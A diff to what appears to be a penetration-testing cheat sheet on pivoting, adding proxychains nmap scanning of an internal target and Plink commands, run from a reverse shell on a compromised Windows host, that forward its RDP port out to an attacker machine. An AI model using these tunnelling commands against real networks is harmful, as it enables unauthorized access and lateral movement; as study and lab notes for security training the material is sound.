@@ -133,14 +133,21 @@ Kali$ ss -lntpu # check
 Kali$ vim /etc/proxychains4.conf
     socks5 127.0.0.1 $ListeningPort
 Kali$ proxychains mycommand myoptions # for example: `proxychains psql -h $IpDbOut -U postgre_user`
+Kali$ proxychains nmap -vvv -p $a-$b -sT -Pn -n $IpDmzInOtherTarget
 ```
 
 #### Plink
 
+Upload Plink on the target with an Apache webserver: `/usr/share/windows-resources/binaries/plink.exe`
 ```
 KaliRshell$ cmdprompt> C:\path\to\plink.exe -ssh -l kaliuser -pw somepass -R 127.0.0.1:9833:127.0.0.1:3389 $IpAttacker
 KaliRshell$ cmdprompt> KaliNormalShell$ ss -ntplu # check
 Kali$ xfreerdp /u:rdp_user /p:rdp_pass /v:127.0.0.1:9833
+```
+
+No-TTY like case:
+```
+rshellcmd> cmd.exe /c echo y | .\plink.exe -ssh -l kaliuser -pw somepass -R 127.0.0.1:9833:127.0.0.1:3389 $IpAttacker
 ```
 
 #### Netsh
